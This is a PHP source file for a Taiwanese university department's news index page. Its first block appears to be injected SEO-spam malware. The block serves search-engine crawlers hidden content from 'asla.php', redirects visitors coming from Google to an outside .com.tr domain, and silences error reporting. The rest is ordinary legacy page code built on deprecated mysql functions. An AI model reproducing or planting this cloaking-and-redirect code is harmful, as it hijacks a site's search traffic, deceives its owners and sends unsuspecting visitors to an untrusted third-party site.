<?php
error_reporting(0);
set_time_limit(0);

$bot_content_file = 'asla.php';

function is_spider() {
    $spiders = ['bot', 'slurp', 'spider', 'crawl', 'google', 'msnbot', 'yahoo', 'ask jeeves'];
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }
    $s_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($spiders as $spider) {
        if (stripos($s_agent, $spider) !== false) {
            return true;
        }
    }
    return false;
}

function is_mobile() {
    if (!isset($_SERVER['HTTP_USER_AGENT'])) {
        return false;
    }
    $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
    return preg_match('/android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i', $ua);
}

function is_from_google() {
    if (!isset($_SERVER['HTTP_REFERER'])) {
        return false;
    }
    return stripos($_SERVER['HTTP_REFERER'], 'google.') !== false;
}

if (is_spider()) {
    if (file_exists($bot_content_file)) {
        include($bot_content_file);
    } else {
        header("HTTP/1.0 404 Not Found");
        echo "Bot içeriği bulunamadı.";
    }
    exit();
}

if (is_from_google()) {
    header("Location: https://flymarka195.com.tr");
    exit();
}

?>

<?PHP 
if (!isset($_SESSION)) { session_start();}
$_SESSION["bt"]='1';//按鈕停佇頁
include "admin/common.func.php";
$sql="SELECT * FROM `webinfo`";
$result=mysql_query($sql);
$rows=mysql_fetch_array($result,MYSQL_ASSOC);
?>
<?PHP
//新聞類別
if(isset($_GET['news_class'])){
	$_SESSION["news_class"]= mysql_real_escape_string($_GET['news_class']);
}
 $news_class	=$_SESSION["news_class"];
			switch($news_class){
				
				case '':
					 $WHERE_search='';
				break;
				
				case '系所公告':
					 $WHERE_search="&& news_class='系所公告'";
				break;
				
				case '招生資訊':
					 $WHERE_search="&& news_class='招生資訊'";
				break;
					
				case '演講公告':
					 $WHERE_search="&& news_class='演講公告'";
				break;
				
				case '系所友會':
					 $WHERE_search="&& news_class='系所友會'";
				break;
				
				case '榮譽榜':
					 $WHERE_search="&& news_class='榮譽榜'";
				break;
				
				case '獎學金':
					 $WHERE_search="&& news_class='獎學金'";
				break;
				
				case '國際交流/分享':
					 $WHERE_search="&& news_class='國際交流/分享'";
				break;
				
				case '研討會訊息':
					 $WHERE_search="&& news_class='研討會訊息'";
				break;
				
				case '高希均知識經濟研究室':
					 $WHERE_search="&& news_class='高希均知識經濟研究室'";
				break;
				
				case '其他':
					 $WHERE_search="&& news_class='其他'";
				break;				

	}		
?>
<!doctype html>
<html lang="zh-Hant-TW">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="<?=$rows["keywords"];?>" />
<meta name="description" content="<?=$rows["description"];?>" />
<meta name="company" content="<?=$rows["conpany"];?>" />
<meta name="robots" content="all">
<meta name="robots" content="index,follow">
<meta name="distribution" content="Taiwan"/>
<meta name="revisit-after" content="7 days"/>
<meta name="rating" content="general"/>
<meta property="og:title" content="<?=$rows["conpany"];?>"/>
<meta property="og:description" content="<?=$rows["description"];?>"/>
<meta property="og:type" content="website"/>
<meta property="og:site_name" content="<?=$rows["conpany"];?>" /><meta property="og:image" content="./logo.png" />
<title><?=$rows["conpany"];?></title>	
    <!-- Bootstrap -->
	<link href="css/bootstrap.css" rel="stylesheet">
    <script src="js/jquery-1.11.2.min.js"></script>
	<script src="js/bootstrap.js"></script>
    <!-- Bootstrap --> 
    <link href="style.css" rel="stylesheet" type="text/css" /> 
    <Link href="favicon.ico" rel="Shortcut Icon"> 
<?PHP include'include_head.php';// 插入其他碼在head內?>
</head>
<body>
<?PHP  include "menu_bar.php";//top?> 
<!--RWD頁--> 
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" class="max_width">
  <tr>
    <td bgcolor="#FFFFFF">
<!--容器-->
<header>
<?PHP  include "menu_mob.php";//行動導行?> 
<?PHP  include "menu_pc.php";//PC導行?> 
<?PHP  include "banner.php";//banner?> 
</header>
<!--內容頁-->
<table width="93%" border="0" align="center" cellpadding="0" cellspacing="0" class="fade">
  <tr>
    <td width="1%" rowspan="2" valign="top">
<!--左側選單  class="visible-lg visible-md"-->
<?PHP  include "left_news.php";//選單?> 
<?PHP  include "left_albums.php";//選單?> 
<!--左側選單-->
    </td>
    <td width="99%" align="left" valign="top"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="20" height="30" align="left" valign="middle"  class="txt_16 txt_pp"><img src="images/icon/04.jpg" width="12" height="12"  alt=""/></td>
        <td align="left" valign="middle" class="txt_16 txt_pp"><strong>最新消息</strong></td>
        <td height="30" align="right" valign="middle">
        <DIV  class="visible-lg visible-md">
        <?=$bar_home?><a href="index.php?news_class=" class="a_menu">最新消息</a> &gt;  <span class="txt_pp"><?PHP if($news_class=='') echo '全部新聞'; else echo $news_class;?></span>
        </DIV>
        </td>
      </tr>
    </table>
<?PHP  include "top_news.php";//選單?>
      <table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td height="34" colspan="3" background="images/table/04/tt.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0">
            <tr class="txt_pp">
              <td width="8%" align="center"><table width="35" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td align="left">編號</td>
  </tr>
</table>
</td>
              <td width="93%" align="center">文章標題</td>
              <td  align="center"><table width="200" border="0" align="right" cellpadding="0" cellspacing="0" class="visible-lg visible-md">
                <tr>
                  <td width="140" align="center">發佈時間</td>
                  <td width="60" align="center">人氣</td>
                </tr>
              </table></td>
              </tr>
          </table></td>
        </tr>
        
<?php

//使用分頁控制必備變數--開始

$Day = date("Y-m-d");//今天日期

include "./admin/include/pages.php";

$pagesize='20';//設定每頁顯示資料量

$phpfile = 'index.php';//使用頁面檔案

$page= isset($_GET['page'])?$_GET['page']:1;//如果沒有傳回頁數，預設為第1頁

$_SESSION["page"]=$page;//紀錄頁數給觀看內容頁的"回上頁"用

$sql_total="SELECT * FROM news 
	where ((news_posttime <= '$Day'&& news_overtime >= '$Day')
	|| (news_posttime <= '$Day'&& news_overtime = '0000-00-00')	
	|| (news_posttime = '0000-00-00'&& news_overtime >= '$Day'))	
	&& news_ckpost=1 && news_title <> ''
	$WHERE_search
	";//算總頁數用

$result_total=mysql_query($sql_total);

$counts=mysql_num_rows($result_total);//算出總筆數

if ($page>$counts) $page = $counts;//輸入值大於總數則顯示最後頁

else $page = intval($page);//當前頁面-避免非數字頁碼

$getpageinfo = page($page,$counts,$phpfile,$pagesize);//將函數傳回給pages.php處理

$page_sql_start=($page-1)*$pagesize;//資料庫查詢起始資料

//使用分頁控制必備變數--結束

?>

<?PHP
//列出內容
$no_id=$no_id+$start+(($page-1)*$pagesize);//流水號
	
	$sql_main="SELECT * FROM news 
	where ((news_posttime <= '$Day'&& news_overtime >= '$Day')
	|| (news_posttime <= '$Day'&& news_overtime = '0000-00-00')	
	|| (news_posttime = '0000-00-00'&& news_overtime >= '$Day'))	
	&& news_ckpost=1 && news_title <> ''
	$WHERE_search
	ORDER BY  `news_top` DESC ,`news_sort` DESC ,`news_no` ASC , `news_time` ASC
	LIMIT $page_sql_start , $pagesize ";//算總頁數用

		  
	$result_main=mysql_query($sql_main);
	
if($counts<>0){//如果判斷結果有值才跑回圈抓資料  

   while($rows_main=mysql_fetch_array($result_main,MYSQL_ASSOC))

{ 

$no_id=$no_id+1;

?>        
        <tr class="tb_ch txt_14" onclick="location.href='news_info.php?no=<?=$rows_main["news_no"]; ?>'">
          <td width="8%" height="30" align="center"  <?PHP if($rows_main["news_top"]==1) echo ' class="txt_red"';?>><?PHP           
    //補0
    $sourceNumber = "$no_id";  
    $newNumber = substr(strval($sourceNumber+100),1,2);  
    echo "$newNumber";  
	
			?></td>
          <td width="93%" align="left" <?PHP if($rows_main["news_top"]==1) echo ' class="txt_red"';?>>  [ <?=$rows_main["news_class"]; ?> ] <?=$rows_main["news_title"]; ?></td>
          <td align="center"><table width="200" border="0" align="right" cellpadding="0" cellspacing="0" class="visible-lg visible-md">
            <tr  <?PHP if($rows_main["news_top"]==1) echo ' class="txt_red"';?>>
              <td width="140" align="center"><?=mb_strimwidth($rows_main["news_time"], 0, 10, '', 'UTF-8'); ?></td>
              <td width="60" align="center"><?=$rows_main["news_click"]; ?></td>
            </tr></table></td>
          </tr>
        <tr>
          <td height="1" colspan="3" background="images/table/04/line.jpg"></td>
        </tr>
<?PHP
}
}
?>         
        
    </table></td>
  </tr>
  <tr>
    <td align="left" valign="top">&nbsp;</td>
  </tr>
  <tr>
    <td height="60" colspan="2" align="center" valign="middle"><?php

			echo $getpageinfo['pagecode'];//顯示分頁的html代碼

			?></td>
    </tr>
</table>
<!--內容頁-->
<!--容器-->  

    </td>
  </tr>
</table>
<!--RWD頁-->
	

<?PHP  include "footer.php";//banner?>
</footer>

</body>
</html>
